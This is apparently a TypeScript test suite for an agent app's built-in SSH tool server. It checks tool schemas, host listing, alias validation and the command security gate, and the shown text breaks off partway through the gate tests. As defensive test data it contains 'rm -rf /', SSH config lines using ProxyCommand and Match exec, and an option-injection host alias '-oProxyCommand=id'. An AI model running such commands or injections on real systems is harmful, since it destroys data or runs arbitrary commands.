/**
 * 内置能力服务器 `ssh` —— 隔着**真的 MCP 协议**看它。
 *
 * 用 `InMemoryTransport.createLinkedPair()` + SDK 的 `Client` 驱动，而不是直接调处理函数：
 * 这台 server 的产出全都要过一遍协议层（工具声明、`structuredContent` 对 outputSchema 的校验、
 * 未知工具的错误形态、断开的传播），绕过协议就等于把要测的那一层测没了。
 *
 * 钉的是这几件事：
 *   85…87    **工具面**：无参工具显式只收空对象，annotations 如实声明 ——
 *            模型据此判断「这是不是一个可以随便调的工具」；
 *   88…94    **产出**：文本与 structuredContent 两份、空配置不是错误、人读行的格式、
 *            上限截断要**说出来**、以及每次调用现读配置（用户可能刚改过 ~/.ssh/config）；
 *   95…97    **边界**：未知工具是一条普通的错误结果而不是断连、主机枚举**绝不起进程**
 *            （`ssh -G` 会执行 `Match exec` 里的 shell 命令）、客户端断开会传到 server 侧的
 *            释放钩子上；
 *   98…126   **exec / disconnect**：别名的第二道复核、命令级安全门（客体与 opts 的契约、
 *            反馈 / 拒绝 / 灾难命令 / 没有输入面板）、询问卡片的路由键与目标机器、
 *            结果翻译（远端自己的退出码 vs ssh 连不上）、超时的取值与钳位、中止、
 *            状态条，以及会话释放今天的那个缺口；
 *   127…130  **传输类工具的工具面**：`sync` 探测到 rsync 才声明（两条分支各写死一份清单）、
 *            三份 annotations 与 schema、以及「工具面枚举确实探一次 rsync，且一个进程只探一次」
 *            —— 96 那句「枚举不起进程」只管主机别名那一侧；
 *   131…160  **传输类工具的门**：别名复核先于路径门、必填项、本地路径怎么解析（`..` 会折、
 *            `~` 不展开）、`enforcePath` 的模式与 opts 契约、四条内置路径策略、
 *            询问的五种应答（deny / 无面板 / 取消 / 反馈 / 允许并记住）与卡片形状；
 *   161…170  **下发与 sync 独有的两道**：交给 sshCopy / sshSync 的形状、超时钳位、
 *            rsync 远端路径白名单、合成出来的那条 `rsync --server …` 过命令门
 *            （而 upload/download 刻意不过 —— 它们走 SFTP）；
 *   171…177  **传输结果的翻译**：四句 done、255 该不该翻、超时、其余非零、状态条。
 *
 * 另有一条装配期的对账：内置工厂表的键必须与迁移种下的那一行同名 —— 两边一旦对不上，
 * 会话里那台服务器会在建连的一瞬间抛「没注册」。
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { existsSync } from 'node:fs'
import { createRequire } from 'node:module'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js'
import type { Transport } from '@modelcontextprotocol/sdk/shared/transport.js'
import type {
  AskInputRequest,
  InputRequest,
  InputResponse
} from '@shuvix/chat-protocol/types/inputRequest'
import { initShellParser } from '@shuvix/agent-runtime'

// mock 路径按**测试文件**解析：被测模块在 services/builtinMcp/，测试在其 __tests__/ 下
const logged = vi.hoisted(() => ({ lines: [] as string[] }))

/**
 * 安全门后面是**真的**安全模块。
 *
 * mock 掉的只是 `getDesktopSecurityContext` 那条会拉起 Electron app 与整个 service 图的
 * 取用路径；门后仍是 `createSecurityContext` 本体，主体/环境/变量表按 toolContext 的生产
 * 形态复刻，内置策略一条不少。换成「永远放行」的 stub 就等于在测那个 stub —— 而这一组问的
 * 恰恰是 exec 到底过没过那道门：**内置能力服务器相对第三方 server 的实质特权就是这一句**。
 */
const gate = vi.hoisted(() => ({
  /** enforceCommand 收到的实参 —— 契约就在这两个对象里 */
  calls: [] as Array<{ object: unknown; opts: unknown }>,
  /** enforcePath 收到的实参（传输类工具的本地那一侧走它） */
  pathCalls: [] as Array<{ mode: unknown; path: unknown; opts: unknown }>,
  /** 「允许并记住」落下来的授权（生产里写进会话 allowList） */
  grants: [] as Array<{ mode: unknown; path: unknown }>,
  /** 这条会话的用户策略；空 = 只有内置那套 */
  policies: [] as unknown[],
  /** 免询问开关（session-auto-allow 的 force-allow） */
  autoAllow: false
}))

vi.mock('../../toolContext', async () => {
  const { createSecurityContext, analyzeShellCommand } = await import('@shuvix/agent-runtime')
  type Ctx = Parameters<typeof import('../../toolContext').getDesktopSecurityContext>[0]
  return {
    TOOL_ABORTED: 'Aborted',
    // 相对路径解析的锚点。**必须与上面 vars.workspace 是同一个值** —— 两者一旦分叉，
    // 「工作目录内的读不询问」这类断言就变成了在测两个不相干的常量
    resolveProjectConfig: () => ({ workingDirectory: '/ws' }),
    getDesktopSecurityContext: (ctx: Ctx) => {
      const real = createSecurityContext(
        // J10：这里逐字复刻 toolContext 今天上报的主体 —— 固定 root，档案维度还没接线
        { kind: 'agent', sessionId: ctx.sessionId, agentKind: 'root' },
        { host: 'desktop', platform: process.platform, workspaceDir: '/ws' },
        {
          host: 'desktop',
          pathSep: '/',
          getVars: () => ({
            workspace: '/ws',
            toolResultsBase: '/tool-results',
            skillsDirs: ['/skills'],
            memoryDirs: [],
            knowledgeRoot: '/kb',
            knowledgeSessionDirs: [],
            home: '/home/u',
            botsDir: '/home/u/.shuvix/bots',
            builtinKnowledgeDir: '/opt/shuvix/Resources/knowledge',
            systemDirs: []
          }),
          readBuiltinPolicyMd: INLINE_POLICY_MD,
          getSessionGrants: () => ({ autoAllow: gate.autoAllow, allowList: [] }),
          getUserPolicies: () => gate.policies as never,
          // 生产里这是 sessionService.addAllowListPaths —— 「允许并记住」的唯一落点。
          // 抄一份下来，那颗复选框到底记住了**什么形状的条目**才看得见
          persistGrant: (mode: never, p: never) => void gate.grants.push({ mode, path: p }),
          shellParser: { ensureReady: async () => {}, analyze: analyzeShellCommand },
          // 询问通道由 scope 注入：缺席就是「这条会话没有输入面板」，fail-closed 用例靠它
          requestUserInput: ctx.requestUserInput
        }
      )
      return {
        ...real,
        enforceCommand: (object: never, opts: never) => {
          gate.calls.push({ object, opts })
          return real.enforceCommand(object, opts)
        },
        // 与 enforceCommand 同样的包法：抄一份实参，门后仍是本体。
        // 传输类工具的本地那一侧走这道门，而它是否真的与本地读写同一条路
        // （ask-on-read / protect-credentials / 沙箱照样生效）只有在真引擎后面才答得出来
        enforcePath: (mode: never, path: never, opts: never) => {
          gate.pathCalls.push({ mode, path, opts })
          return real.enforcePath(mode, path, opts)
        }
      }
    }
  }
})
vi.mock('../../../utils/paths', () => ({ buildSpawnEnv: () => ({}) }))
// 工厂表（../index）同时登记了 browser 与 database —— 它们的桌面接线会拉进 Electron 的浏览器面板
// 与凭据 DAO，这份测试只关心 ssh，也只核对工厂表的键，所以换成空工厂
vi.mock('../browserServer', () => ({ createDesktopBrowserMcpServerFactory: () => () => undefined }))
vi.mock('../databaseServer', () => ({
  createDatabaseMcpServerFactory: () => () => undefined,
  DATABASE_MCP_SERVER_NAME: 'database'
}))

/**
 * 连接层是假的 —— 这一组问的是 server 的判断，不是 ssh 的行为。
 *
 * 只换会真的起 ssh / scp / rsync 的那几个出口；`classifySshFailure` 与
 * `unsafeRemotePathReason` 走**原件** —— 「255 该不该翻译」和「哪些远端路径
 * rsync 会交给远端 shell」正是这两层要端到端回答的问题，换成假件就把要测的那一层测没了。
 */
const control = vi.hoisted(() => ({
  exec: [] as Array<Record<string, unknown>>,
  /** 下一次 sshExec 的应答；Error = 直接 reject（ssh 二进制不在等） */
  result: { stdout: '', stderr: '', exitCode: 0, timedOut: false } as
    | { stdout: string; stderr: string; exitCode: number; timedOut: boolean }
    | Error,
  /** sshCopy（scp）与 sshSync（rsync）各自收到的实参 */
  copy: [] as Array<Record<string, unknown>>,
  sync: [] as Array<Record<string, unknown>>,
  /** 下一次传输的应答；Error = 直接 reject */
  transfer: { stdout: '', stderr: '', exitCode: 0, timedOut: false } as
    | { stdout: string; stderr: string; exitCode: number; timedOut: boolean }
    | Error,
  /**
   * rsync 探测的覆写。缺省置位成布尔值，于是**除了那条专门问它的用例，
   * 谁也碰不到原件**——原件的 promise 是进程级缓存的，只让一条用例拥有它，
   * 「一个进程只探一次」才断言得起来（否则先跑的那条把缓存吃掉，后跑的看到零次）
   */
  rsync: true as boolean | undefined,
  disconnect: [] as Array<{ sessionId: string; alias: string }>,
  /** sshDisconnect 的返回值 = 「本来是否连着」 */
  wasConnected: true,
  /** sshConnectedAliases 眼里连着的别名 */
  connected: [] as string[],
  closeSession: [] as Array<{ sessionId: string; aliases: string[] }>
}))

vi.mock('../sshControl', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../sshControl')>()
  const transfer = async (
    into: Array<Record<string, unknown>>,
    opts: Record<string, unknown>
  ): Promise<unknown> => {
    into.push(opts)
    if (control.transfer instanceof Error) throw control.transfer
    return control.transfer
  }
  return {
    ...actual,
    sshExec: async (opts: Record<string, unknown>) => {
      control.exec.push(opts)
      if (control.result instanceof Error) throw control.result
      return control.result
    },
    sshCopy: (opts: Record<string, unknown>) => transfer(control.copy, opts),
    sshSync: (opts: Record<string, unknown>) => transfer(control.sync, opts),
    rsyncAvailable: async () =>
      control.rsync === undefined ? actual.rsyncAvailable() : control.rsync,
    sshDisconnect: async (sessionId: string, alias: string) => {
      control.disconnect.push({ sessionId, alias })
      return control.wasConnected
    },
    sshConnectedAliases: (_sessionId: string, aliases: string[]) =>
      aliases.filter((a) => control.connected.includes(a)),
    sshCloseSession: async (sessionId: string, aliases: string[]) => {
      control.closeSession.push({ sessionId, aliases })
      return 0
    }
  }
})
vi.mock('../../../logger', () => ({
  createLogger: () => ({
    info: (m: string) => void logged.lines.push(m),
    warn: () => {},
    error: () => {}
  })
}))

/** 枚举阶段起进程 = 当场记一笔（今天根本不 import child_process，这是回归闸门） */
const cp = vi.hoisted(() => {
  const calls: string[] = []
  const rec =
    (name: string) =>
    (...args: unknown[]): never => {
      calls.push(`${name}(${String(args[0])})`)
      throw new Error(`ssh 别名枚举不该起进程：${name}`)
    }
  const api = {
    spawn: rec('spawn'),
    spawnSync: rec('spawnSync'),
    exec: rec('exec'),
    execSync: rec('execSync'),
    execFile: rec('execFile'),
    execFileSync: rec('execFileSync'),
    fork: rec('fork')
  }
  return { calls, factory: (): Record<string, unknown> => ({ ...api, default: api }) }
})
vi.mock('child_process', cp.factory)
vi.mock('node:child_process', cp.factory)

import { migrations } from '../../../dao/migrations'
import { BUILTIN_MCP_FACTORIES } from '../index'
import { createSshMcpServerFactory } from '../sshServer'
import { rsyncAvailable } from '../sshControl'
import { createInlinePolicyMdReader } from '@shuvix/agent-runtime/security/builtinPolicies/inlineSources'
import { BUILTIN_MCP_PRESENTATIONS } from '@shuvix/chat-protocol/builtinMcpPresentations'

/** 内置策略 md 的构建期内联读取口（真实装配链要它；测试进程，不进桌面 bundle） */
const INLINE_POLICY_MD = createInlinePolicyMdReader()

// ─── 素材 ────────────────────────────────────────────────────────────────

const roots: string[] = []
let sshDir = ''
let configPath = ''

/**
 * 真 tree-sitter-bash —— block-catastrophic-commands 是唯一读**结构事实**的内置策略，
 * 而「它在 ssh 通道上照样管用」正是这一组要端到端回答的问题。wasm 字节的定位同
 * shellParserService 的开发态分支（仓库根 node_modules，workspace hoist 后两个包都在那里）。
 */
beforeAll(async () => {
  const require = createRequire(import.meta.url)
  await initShellParser({
    runtime: new Uint8Array(readFileSync(require.resolve('web-tree-sitter/web-tree-sitter.wasm'))),
    grammar: new Uint8Array(readFileSync(require.resolve('tree-sitter-bash/tree-sitter-bash.wasm')))
  })
})

beforeEach(() => {
  const root = mkdtempSync(join(tmpdir(), 'shuvix-sshsrv-'))
  roots.push(root)
  sshDir = join(root, '.ssh')
  mkdirSync(sshDir, { recursive: true })
  configPath = join(sshDir, 'config')
  logged.lines.length = 0
  cp.calls.length = 0
  gate.calls.length = 0
  gate.pathCalls.length = 0
  gate.grants.length = 0
  gate.policies.length = 0
  gate.autoAllow = false
  control.exec.length = 0
  control.copy.length = 0
  control.sync.length = 0
  control.disconnect.length = 0
  control.closeSession.length = 0
  control.connected.length = 0
  control.result = { stdout: '', stderr: '', exitCode: 0, timedOut: false }
  control.transfer = { stdout: '', stderr: '', exitCode: 0, timedOut: false }
  control.rsync = true
  control.wasConnected = true
})

afterAll(() => {
  for (const r of roots) rmSync(r, { recursive: true, force: true })
})

interface Session {
  client: Client
  clientTransport: Transport
  /** 这条会话弹出的询问卡片（安全门经 scope.requestUserInput 挂的那些） */
  asks: InputRequest[]
  /** 运行时状态条事件（连接状态 chip） */
  events: Array<Record<string, unknown>>
}

interface OpenOpts {
  sessionId?: string
  /** 询问应答；`null` = 这条会话没有输入面板（fail-closed 用例） */
  respond?: ((req: InputRequest) => Promise<InputResponse>) | null
}

/** 把一台 ssh server 接到一对真 InMemoryTransport 上，并连一个真 Client */
async function open(opts: OpenOpts = {}): Promise<Session> {
  const asks: InputRequest[] = []
  const events: Array<Record<string, unknown>> = []
  const respond =
    opts.respond === undefined
      ? async (): Promise<InputResponse> => ({ kind: 'ask', allowed: true })
      : opts.respond
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair()
  await createSshMcpServerFactory({ configPath })(
    {
      sessionId: opts.sessionId ?? 's1',
      requestUserInput: respond
        ? async (req: InputRequest): Promise<InputResponse> => {
            asks.push(req)
            return respond(req)
          }
        : undefined,
      emitChatEvent: (e) => void events.push(e as unknown as Record<string, unknown>)
    },
    serverTransport
  )
  const client = new Client({ name: 'test', version: '0.0.0' })
  await client.connect(clientTransport)
  return { client, clientTransport, asks, events }
}

function writeConfig(text: string): void {
  writeFileSync(configPath, text)
}

interface ListHostsResult {
  content: Array<{ type: string; text?: string }>
  structuredContent?: {
    configPath: string
    total: number
    truncated: boolean
    hosts: Array<{ alias: string; hostname?: string; user?: string; port?: number }>
  }
  isError?: boolean
}

const call = async (client: Client, name = 'list-hosts'): Promise<ListHostsResult> =>
  (await client.callTool({ name, arguments: {} })) as unknown as ListHostsResult

const textOf = (r: ListHostsResult): string =>
  r.content
    .map((c) => c.text ?? '')
    .join('\n')
    .trim()

// ─── 工具面 ──────────────────────────────────────────────────────────────

describe('ssh 内置服务器的工具声明', () => {
  it('SSHS-U-127: sync 探测到 rsync 才声明 —— 两条分支各自写死一份清单', async () => {
    writeConfig('Host web\n')

    // 旧版这条用例把期望值**从实现读的同一个缓存里算出来**（`await rsyncAvailable()`），
    // 于是 sync 一行都不声明它也照样绿 —— 两个分支都得把清单逐字写下来才算断言
    control.rsync = true
    const full = (await (await open()).client.listTools()).tools.map((t) => t.name)
    expect(full).toEqual(['list-hosts', 'exec', 'upload', 'download', 'sync', 'disconnect'])
    // 界面那边的防冒名白名单（builtinMcpPresentations 的 ssh.toolNames）必须就是这份全集 ——
    // 名单漏一个，那个工具就在界面上丢了图标、标签、折叠摘要（exec 还丢了终端形态）
    expect([...BUILTIN_MCP_PRESENTATIONS.ssh.toolNames].sort()).toEqual([...full].sort())

    // 声明一个跑不起来的工具，只会让模型在上面反复撞墙（Windows 没有 rsync，
    // macOS 15 起换成了选项不全的 openrsync）
    control.rsync = false
    expect((await (await open()).client.listTools()).tools.map((t) => t.name)).toEqual([
      'list-hosts',
      'exec',
      'upload',
      'download',
      'disconnect'
    ])
  })

  it('SSHS-U-128: 三个传输工具的 annotations —— 只有幂等那一位三者不同', async () => {
    writeConfig('Host web\n')
    const { client } = await open()
    const tools = (await client.listTools()).tools
    const ann = (name: string): unknown => tools.find((t) => t.name === name)?.annotations

    // 传文件会覆盖目标 → destructive；同一次上传重跑一遍结果一样 → idempotent；
    // 远端是本进程之外的世界 → openWorld
    expect(ann('upload')).toMatchObject({
      readOnlyHint: false,
      destructiveHint: true,
      idempotentHint: true,
      openWorldHint: true
    })
    expect(ann('download')).toMatchObject({
      readOnlyHint: false,
      destructiveHint: true,
      idempotentHint: true,
      openWorldHint: true
    })
    // sync 不幂等：它照的是**当下**的目录树，两次之间源变了结果就变
    expect(ann('sync')).toMatchObject({
      readOnlyHint: false,
      destructiveHint: true,
      idempotentHint: false,
      openWorldHint: true
    })
  })

  it('SSHS-U-129: 三份入参 schema —— 必填项、direction 的枚举、只收声明过的键', async () => {
    writeConfig('Host web\n')
    const { client } = await open()
    const tools = (await client.listTools()).tools
    const schemaOf = (name: string): Record<string, unknown> =>
      tools.find((t) => t.name === name)!.inputSchema as unknown as Record<string, unknown>

    for (const name of ['upload', 'download']) {
      const s = schemaOf(name)
      expect(s.required).toEqual(['host', 'localPath', 'remotePath'])
      // 多一个键就报错，而不是静默忽略 —— 模型写错键名时要当场知道
      expect(s.additionalProperties).toBe(false)
      expect(Object.keys(s.properties as object)).toEqual([
        'host',
        'localPath',
        'remotePath',
        'timeout'
      ])
      // 方向由工具名定死，所以这两个工具不该声明它
      expect((s.properties as Record<string, unknown>).direction).toBeUndefined()
    }

    const sync = schemaOf('sync')
    // sync 一个工具两个方向，所以 direction 是必填而不是可选
    expect(sync.required).toEqual(['host', 'localPath', 'remotePath', 'direction'])
    expect(sync.additionalProperties).toBe(false)
    expect((sync.properties as Record<string, { enum?: unknown }>).direction.enum).toEqual([
      'up',
      'down'
    ])
  })

  it('SSHS-U-130: 枚举工具面会探一次 `rsync --version`，且一个进程只探这一次', async () => {
    writeConfig('Host web\n')
    // 这条是全文件唯一放原件出来的用例（见 control.rsync 的注）—— 探测的 promise
    // 是模块级缓存的，只让一条用例拥有它，「只探一次」才断言得起来
    control.rsync = undefined
    const { client } = await open()

    // SSHS-U-96 说的「枚举绝不起进程」只管**主机别名**那一侧（`ssh -G` 会执行
    // `Match exec` 里的 shell 命令）。工具面这一侧确实起一个进程，这里把它钉住：
    // 一次，而不是每次 listTools 一次 —— 一台机器上装没装 rsync 不会在运行期变
    await client.listTools()
    await client.listTools()
    await rsyncAvailable()

    expect(cp.calls).toEqual(['spawn(rsync)'])
    // 这个文件把 spawn 整个换成了「起进程就抛」，所以探测必然答 false 并被缓存下来 ——
    // 缓存的是**已落定的 promise**，于是后面的调用一个进程都不再起
    await expect(rsyncAvailable()).resolves.toBe(false)
    expect(cp.calls).toEqual(['spawn(rsync)'])
  })

  it('SSHS-U-86: 无参工具 —— 显式只接受空对象', async () => {
    writeConfig('')
    const { client } = await open()
    const [tool] = (await client.listTools()).tools

    expect(tool.inputSchema).toEqual({ type: 'object', additionalProperties: false })
    expect(tool.inputSchema.properties).toBeUndefined()
  })

  it('SSHS-U-87: annotations 如实声明「只读、不破坏、幂等、封闭世界」', async () => {
    writeConfig('')
    const { client } = await open()
    const [tool] = (await client.listTools()).tools

    // 这四位是模型判断「要不要先问用户」的依据，写错一位的代价在别处看不出来
    expect(tool.annotations).toMatchObject({
      readOnlyHint: true,
      destructiveHint: false,
      idempotentHint: true,
      openWorldHint: false
    })
  })
})

// ─── 产出 ────────────────────────────────────────────────────────────────

describe('ssh 内置服务器的 list-hosts 产出', () => {
  it('SSHS-U-88: 文本与 structuredContent 两份都有', async () => {
    writeConfig('Host web\n  HostName 1.2.3.4\n')
    const { client } = await open()
    await client.listTools() // 先发现：之后 callTool 会拿 outputSchema 校验 structuredContent
    const result = await call(client)

    expect(result.isError).toBeFalsy()
    expect(result.structuredContent).toMatchObject({
      configPath,
      hosts: [{ alias: 'web', hostname: '1.2.3.4' }]
    })
    // 不读 structuredContent 的客户端也要能看懂 —— 规范要求带 outputSchema 的工具同时回文本
    expect(textOf(result)).toContain('web')
    expect(textOf(result)).toContain(configPath)
  })

  it('SSHS-U-89: 空配置不是错误，而是「去 ~/.ssh/config 里加一台」', async () => {
    const { client } = await open()
    const result = await call(client)

    expect(result.isError).toBeFalsy()
    expect(result.structuredContent?.hosts).toEqual([])
    expect(result.structuredContent?.total).toBe(0)
    // 这台 server 只能按别名寻址，所以空列表必须把下一步告诉用户，而不是干巴巴回一个空数组
    expect(textOf(result)).toContain('add a Host entry')
    expect(textOf(result)).toContain(configPath)
  })

  it('SSHS-U-90: 人读的一行是 `alias  →  user@hostname:port`', async () => {
    writeConfig('Host web\n  HostName 1.2.3.4\n  User bob\n  Port 2222\n')
    const { client } = await open()

    expect(textOf(await call(client))).toContain('web  →  bob@1.2.3.4:2222')
  })

  it('SSHS-U-91: 只写了别名的块，光秃秃地印出来（不留半截箭头）', async () => {
    writeConfig('Host bare\n')
    const { client } = await open()
    const lines = textOf(await call(client)).split('\n')

    expect(lines.some((l) => l.trim() === 'bare')).toBe(true)
    expect(textOf(await call(client))).not.toContain('→')
  })

  it('SSHS-U-92 / 93: 超过上限只回 200 条，并在文本与 structuredContent 里都说清楚', async () => {
    writeConfig(
      Array.from({ length: 250 }, (_, i) => `Host h${String(i).padStart(3, '0')}\n`).join('')
    )
    const { client } = await open()
    await client.listTools()
    const result = await call(client)

    expect(result.structuredContent?.hosts).toHaveLength(200)
    // 少了这一句，模型会以为自己看到了全部 —— 「配置里没有这台」的结论就是这么来的
    expect(textOf(result)).toContain('… 50 more not shown')
    expect(result.structuredContent).toMatchObject({ total: 250, truncated: true })
  })

  it('SSHS-U-93: 没被截断时 total 与 truncated 也如实回报', async () => {
    writeConfig('Host a\nHost b\n')
    const { client } = await open()
    await client.listTools()

    expect((await call(client)).structuredContent).toMatchObject({ total: 2, truncated: false })
  })

  it('SSHS-U-94: 每次调用现读配置 —— 用户可能刚改过 ~/.ssh/config', async () => {
    writeConfig('Host before\n')
    const { client } = await open()
    expect((await call(client)).structuredContent?.hosts.map((h) => h.alias)).toEqual(['before'])

    writeConfig('Host after\n')
    // 缓存在实例上只会让人困惑：改完配置要重启会话才看得到，没有任何道理
    expect((await call(client)).structuredContent?.hosts.map((h) => h.alias)).toEqual(['after'])
  })
})

// ─── 边界 ────────────────────────────────────────────────────────────────

describe('ssh 内置服务器的边界', () => {
  it('SSHS-U-95: 未知工具是一条普通的错误结果，连接照旧可用', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    const bad = await call(client, 'tunnel')
    expect(bad.isError).toBe(true)
    expect(textOf(bad)).toBe('Unknown tool: tunnel')

    // 不能把连接搞垮：模型试错一次就要重开一台 server，代价比错误本身大得多
    expect((await call(client)).structuredContent?.hosts.map((h) => h.alias)).toEqual(['web'])
  })

  it('SSHS-U-96: 配置里有 `Match exec` / `ProxyCommand` 也绝不起进程', async () => {
    const sentinel = join(sshDir, 'pwned')
    writeConfig(`Host web
  HostName 1.2.3.4
  ProxyCommand touch ${sentinel}
Match exec "touch ${sentinel}"
  User root
`)
    const { client } = await open()
    const result = await call(client)

    expect(cp.calls).toEqual([])
    expect(existsSync(sentinel)).toBe(false)
    expect(result.structuredContent?.hosts.map((h) => h.alias)).toEqual(['web'])
  })

  it('SSHS-U-97: 客户端断开传到 server 侧的释放钩子上', async () => {
    writeConfig('Host web\n')
    const { clientTransport } = await open({ sessionId: 's-close' })
    expect(logged.lines.some((l) => l.includes('ssh server ready session=s-close'))).toBe(true)

    await clientTransport.close()

    // 「会话结束 → McpManager 关连接 → 这里释放」只有这一条路径：本轮没有要释放的东西，
    // 但钩子必须真的被调到，否则 exec 的 control socket 将来会静默泄漏
    expect(logged.lines.some((l) => l.includes('ssh server closed session=s-close'))).toBe(true)
  })
})

// ─── exec / disconnect ───────────────────────────────────────────────────
//
// exec 是这台服务器唯一有副作用的工具，它的产出因此不是「一段文本」而是四个判断：
// 这个别名是不是用户自己配的（两道复核）、这条命令过没过安全门（**内置服务器相对第三方
// server 的实质特权**）、回来的非零码是远端的意思还是 ssh 自己连不上、以及等多久算超时。
// 每一条都只有在错了之后才看得见：别名放松一格是本地任意命令执行，门漏一次是一条没人批准
// 的远端命令，翻译错一次是让 agent 拿着「认证失败」去改一台其实是命令返回 255 的机器。

/** exec 的一组齐全实参 —— 用例按需覆写其中一两个 */
const execArgs = (patch: Record<string, unknown> = {}): Record<string, unknown> => ({
  host: 'web',
  command: 'uptime',
  description: 'check load',
  ...patch
})

const callTool = async (
  client: Client,
  name: string,
  args: Record<string, unknown>,
  meta?: Record<string, unknown>
): Promise<ListHostsResult> =>
  (await client.callTool({
    name,
    arguments: args,
    ...(meta ? { _meta: meta } : {})
  })) as unknown as ListHostsResult

/** 一份用户策略（同 security/__tests__ 的 userPolicy） */
const userPolicy = (name: string, rules: unknown[]): unknown => ({
  name,
  displayName: name,
  description: '',
  rules,
  body: ''
})

/** 门后拿到的 opts（用例只关心其中一两个键时的取值口） */
const optsOf = (i = 0): Record<string, unknown> => gate.calls[i].opts as Record<string, unknown>

describe('ssh 内置服务器的别名复核', () => {
  it('SSHS-U-98: 不在配置里的别名被拒，并把可用的别名与配置路径一并说出来', async () => {
    writeConfig('Host web\nHost api\n')
    const { client, asks } = await open()

    const r = await callTool(client, 'exec', execArgs({ host: 'nope' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe(
      `"nope" is not a host alias in ${configPath}. Only these aliases can be used: web, api.`
    )
    // 复核在安全门**之前**：一个连名字都不成立的目标不该惊动用户
    expect(control.exec).toEqual([])
    expect(gate.calls).toEqual([])
    expect(asks).toEqual([])
  })

  it('SSHS-U-99: 一台都没配时换一句话 —— 「去 ~/.ssh/config 里加一台」', async () => {
    writeConfig('')
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs({ host: 'nope' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe(
      `No SSH host aliases are defined in ${configPath}, so "nope" cannot be reached. Ask the user to add a Host entry there.`
    )
    expect(control.exec).toEqual([])
  })

  it('SSHS-U-100: disconnect 走同一道复核，两句话逐字相同', async () => {
    writeConfig('Host web\n')
    const { client } = await open()
    expect(textOf(await callTool(client, 'disconnect', { host: 'nope' }))).toBe(
      `"nope" is not a host alias in ${configPath}. Only these aliases can be used: web.`
    )

    writeConfig('')
    expect(textOf(await callTool(client, 'disconnect', { host: 'nope' }))).toBe(
      `No SSH host aliases are defined in ${configPath}, so "nope" cannot be reached. Ask the user to add a Host entry there.`
    )
    expect(control.disconnect).toEqual([])
  })

  it('SSHS-U-101: host 缺席 / 不是字符串 / 只有空白 —— 同一句「必填」', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const args of [
      { command: 'uptime', description: 'd' },
      execArgs({ host: 42 }),
      execArgs({ host: '   ' })
    ]) {
      const r = await callTool(client, 'exec', args)
      expect(r.isError).toBe(true)
      expect(textOf(r)).toBe('A `host` alias is required.')
    }
    expect(control.exec).toEqual([])
    expect(gate.calls).toEqual([])
  })

  it('SSHS-U-102: 空 command 直接回绝 —— 不起进程，也不为此弹一张卡', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    const r = await callTool(client, 'exec', execArgs({ command: '   ' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe('A `command` is required.')
    expect(control.exec).toEqual([])
    // 一张写着空命令的询问卡片，用户既看不懂也批不了
    expect(asks).toEqual([])
    expect(gate.calls).toEqual([])
  })

  it('SSHS-U-103: `-` 开头的记号即便写在配置里，第二道门也不认', async () => {
    // 枚举已经把它滤掉了（SSHC-U-85）；这里问的是**另一道**门 —— 两件事写在两处才叫两道
    writeConfig('Host -oProxyCommand=id\nHost web\n')
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs({ host: '-oProxyCommand=id' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe('"-oProxyCommand=id" is not a usable host alias.')
    // 刻意不是「不在清单里」那句：它形状就不对，而不是碰巧没配
    expect(textOf(r)).not.toContain('Only these aliases')
    expect(control.exec).toEqual([])
  })
})

describe('ssh 内置服务器的命令安全门', () => {
  it('SSHS-U-104: 上报的客体恰是 {channel, command, host}，opts 恰是那六项', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'exec', execArgs({ command: 'df -h', description: 'disk usage' }), {
      'shuvix.dev/toolCallId': 'tc-7'
    })

    expect(gate.calls).toHaveLength(1)
    // host 在客体上，策略才写得出「生产要问、测试放行」（J4）
    expect(gate.calls[0].object).toStrictEqual({
      channel: 'ssh',
      command: 'df -h',
      host: 'web'
    })
    expect(gate.calls[0].opts).toStrictEqual({
      toolCallId: 'tc-7',
      toolName: 'mcp__ssh__exec',
      description: 'disk usage',
      abortError: 'Aborted',
      onOther: 'return',
      // 没有输入面板时 fail-closed —— 一条远端命令不能因为「问不着」就自己跑了
      missingChannel: 'deny'
    })
  })

  it('SSHS-U-105: 用户改说「其它」→ 反馈逐字带回，是正常结果而不是错误，命令没跑', async () => {
    writeConfig('Host web\n')
    const { client } = await open({
      respond: async () => ({ kind: 'other', text: 'use the staging box instead' })
    })

    const r = await callTool(client, 'exec', execArgs())
    expect(r.isError).toBeFalsy()
    expect(textOf(r)).toBe(
      'Command was not executed. User responded with feedback instead:\nuse the staging box instead'
    )
    expect(control.exec).toEqual([])
  })

  it('SSHS-U-106: deny 拦住这次调用 —— 抛出归因，远端一条没跑', async () => {
    writeConfig('Host web\n')
    gate.policies.push(
      userPolicy('no-ssh', [
        { effect: 'deny', match: "object.type == 'command' && object.channel == 'ssh'" }
      ])
    )
    const { client } = await open()

    await expect(client.callTool({ name: 'exec', arguments: execArgs() })).rejects.toThrow(
      /Denied by security policy rule/
    )
    expect(control.exec).toEqual([])
  })

  it('SSHS-U-107: block-catastrophic-commands 在 ssh 通道上照样管用，免询问也压不过', async () => {
    writeConfig('Host web\n')
    // 这条策略读的是**结构事实**（object.commands），所以走的是真解析器
    gate.autoAllow = true
    const { client } = await open()

    await expect(
      client.callTool({ name: 'exec', arguments: execArgs({ command: 'rm -rf /' }) })
    ).rejects.toThrow(/block-catastrophic-commands#0/)
    expect(control.exec).toEqual([])
  })

  it('SSHS-U-108: 这条会话没有输入面板 → 拒绝（fail-closed），不是「问不着就放行」', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ respond: null })

    await expect(client.callTool({ name: 'exec', arguments: execArgs() })).rejects.toThrow(
      'Access denied: this needs your confirmation but there is no way to ask: uptime'
    )
    expect(control.exec).toEqual([])
  })

